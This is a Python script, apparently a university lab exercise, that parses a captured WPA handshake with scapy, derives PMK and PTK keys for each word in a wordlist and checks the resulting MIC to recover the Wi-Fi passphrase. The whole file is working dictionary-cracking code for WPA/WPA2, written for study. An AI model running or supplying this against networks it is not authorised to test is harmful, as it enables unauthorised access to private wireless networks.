#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Miguel Lopes Gouveia & Doriane Tedongmo"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 	= "miguel.lopesgouveia@heig-vd.ch & doriane.tedongmokaffo@heig-vd.ch"
__status__ 	= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file

A           = "Pairwise key expansion" #this string is used in the pseudo-random function

# Can be seen with a wpa.show() in which frame they are
ssid        = wpa[3].info
APmac       = a2b_hex(wpa[1].addr2.replace(":",""))
Clientmac   = a2b_hex(wpa[1].addr1.replace(":",""))

# Authenticator and Supplicant Nonces
ANonce      = (wpa[5].load)[13:45] #we extract the ANonce in the first handshake
SNonce      = (wpa[6].load)[13:45] #we extract the SNonce in the second handshake

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = b2a_hex(wpa[8].load)[154:186] #we extract the mic in the 4th handshake

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée

dico = open("dico.txt") #wordlist file
for word in dico:
	word = word[:-1]  #remove the \n

	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
	pmk = pbkdf2_hex(word, ssid, 4096, 32)

	#expand pmk to obtain PTK
	ptk = customPRF512(a2b_hex(pmk),A,B)

	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
	mic = hmac.new(ptk[0:16],data,hashlib.sha1)

	if(mic.hexdigest()[:-8] == mic_to_test):
		
		print "============================"
		print "Passphrase: ",word,"\n"
		print "MIC:\t\t",mic.hexdigest(),"\n"
		#print wpa.show()
		break;


